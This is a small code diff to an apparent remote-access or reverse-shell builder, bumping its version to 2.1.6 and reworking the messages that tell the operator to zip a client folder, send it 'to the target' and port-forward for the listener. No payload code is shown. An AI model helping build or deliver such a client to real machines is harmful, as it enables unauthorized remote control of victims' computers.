@@ -14,7 +14,7 @@ import sys
 ip = rs.get_ip()
 pwd = os.getcwd()
 system = platform.system()
-version = "2.1.5"
+version = "2.1.6"
 
 if system == "Windows":
     type_of_os = "windows"
@@ -176,8 +176,9 @@ def main(message, port, keygen, server, clean, version, code, local, zip):
         print("zipping folder")
         shutil.make_archive("client/", 'zip', "client")
         print("folder zipped and ready to ship")
-        
-    print("Send the client folder in your directory to the target")
+    else:
+        print("Send the client folder in your directory to the target")    
+    
     print("Remember to portforward port " + str(port)+ " on " + rs.get_ip(True))
 
     if server:
